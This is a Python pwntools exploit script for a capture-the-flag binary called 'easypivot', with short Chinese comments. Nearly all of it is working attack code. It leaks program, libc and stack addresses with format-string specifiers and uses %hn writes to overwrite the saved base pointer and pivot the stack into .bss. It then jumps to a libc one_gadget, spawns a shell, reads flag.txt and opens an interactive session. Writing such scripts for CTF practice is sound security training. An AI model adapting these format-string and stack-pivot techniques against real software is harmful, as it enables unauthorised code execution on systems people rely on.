from pwn import *

context.log_level = "debug"
context.arch = "amd64"
context.os = "linux"
context.terminal = ["/usr/bin/tmux", "sp", "-h"]

f_remote = True if "remote" in sys.argv else False
f_gdb = True if "gdb" in sys.argv else False

vuln_path = "./easypivot"
elf = ELF(vuln_path)
libc = elf.libc

io = process([vuln_path]) if not f_remote else remote("", 9999)


def ddebug(b=""):
    if not f_gdb: return
    gdb.attach(io, gdbscript=b)
    pause()


# u64(io.recvuntil("\x7f")[-6:].ljust(8, b"\x00"))

payload = b""
io.sendlineafter("255)\n> ", "0")
io.sendlineafter("\n> ", "%13$p%47$p%14$p")
io.recvuntil(" annals of history: ", drop=True)
leak = int(io.recv(14), 16)
elf.address = leak - 0x35a0
log.success("elf :-----> " + hex(elf.address))

leak = int(io.recv(14), 16)
libc.address = leak - 0x2a47b
log.success("libc.address :-----> " + hex(libc.address))

leak = int(io.recv(14), 16)
log.success("stack: -----> " + hex(leak))
rbp2 = (leak & 0xffff) #+ 0x40

bss_rop_start = elf.address + 0x35a0 + 0x80
new_rbp = bss_rop_start - 0x10
log.success("new_rbp :-----> " + hex(new_rbp))
d_1_2 = new_rbp >> 16 >> 16
log.success("d12 :-----> " + hex(d_1_2))
d_3_4 = new_rbp >> 16 & 0xffff
log.success("d34 :-----> " + hex(d_3_4))
d_5_6 = new_rbp & 0xffff
log.success("d56 :-----> " + hex(d_5_6))

# new_rbp最后两位
io.sendlineafter("255)\n> ", "1")
io.sendlineafter("\n> ", f"%{d_5_6}c%14$hn")

# new_rbp中间两位
io.sendlineafter("255)\n> ", "2")
payload = f"%{rbp2+2}c%25$hn"
payload = payload.ljust(0x10, "\x00")
io.sendafter("\n> ", payload)
io.sendlineafter("255)\n> ", "3")
payload = f"%{d_3_4}c%63$hn"
payload = payload.ljust(0x10, "\x00")
io.sendafter("\n> ", payload)

# new_rbp前面两位
io.sendlineafter("255)\n> ", "4")
payload = f"%{rbp2+0x4}c%25$hhn"
payload = payload.ljust(0x10, "\x00")
io.sendafter("\n> ", payload)
io.sendlineafter("255)\n> ", "5")
payload = f"%{d_1_2}c%63$hn"
payload = payload.ljust(0x10, "\x00")
io.sendafter("\n> ", payload)

# 打一个rbp进去，方便onegadget
system_addr = libc.symbols.get("system")
binsh_addr = next(libc.search("/bin/sh"))
pop_rdi = next(libc.search(asm("pop rdi; ret")))
rop = ROP(libc)
ret = rop.find_gadget(['ret'])[0]
io.sendlineafter("255)\n> ", "7")
payload = p64(elf.address + 0x3560 + 0x808)
payload += p64(ret)
io.sendafter("\n> ", payload)

# 走onegadget
one = [0xf6237, 0xf6292, 0x11ab5a, 0x11ab62, 0x11ab67]
o = one[1]
io.sendlineafter("255)\n> ", "8")
ddebug(f"breakrva 0x013C9\n breakrva 0x0000136E\n continue")
payload = p64(libc.address + o)
io.sendlineafter("\n> ", payload)

io.sendline(b"cat flag.txt")

io.interactive()
